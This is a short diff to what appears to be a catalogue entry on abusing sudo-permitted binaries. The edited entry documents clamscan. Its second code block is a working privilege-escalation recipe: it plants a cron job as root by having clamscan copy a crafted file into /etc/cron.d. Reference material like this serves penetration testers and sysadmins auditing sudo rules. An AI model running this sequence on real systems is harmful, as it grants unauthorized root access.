@@ -14,15 +14,15 @@ functions:
 
 file-write:
   - code: |-
-      sigtool --md5 file-to-copy > custom_db.hdb
-      sudo clamscan file-to-copy -d custom_db.hdb --copy=/chosen/location
+      sigtool --md5 /path/to/input-file > /path/to/custom_db.hdb
+      sudo clamscan /path/to/input-file -d /path/to/custom_db.hdb --copy=/path/to/output-file
     contexts:
       sudo:
 - code: |-
-      printf "SHELL=/bin/sh\n\n* * * * *   root	/tmp/script.sh" > fake_cron
+      printf "SHELL=/bin/sh\n\n* * * * *   root	/tmp/script.sh" > /tmp/fake_cron
       echo 'id > /tmp/out.txt' > /tmp/script.sh && chmod +x /tmp/script.sh
-      sigtool --md5 fake_cron > custom_db.hdb
-      sudo clamscan fake_cron -d custom_db.hdb --copy=/etc/cron.d/
+      sigtool --md5 /tmp/fake_cron > /tmp/custom_db.hdb
+      sudo clamscan /tmp/fake_cron -d /tmp/custom_db.hdb --copy=/etc/cron.d/
 
     comment: |-
       By crafting a custom signature database that intentionally flags an attacker‑controlled file as malicious, clamscan can be abused to write arbitrary data as root to attacker‑chosen directories, provided the target filename does not already exist.
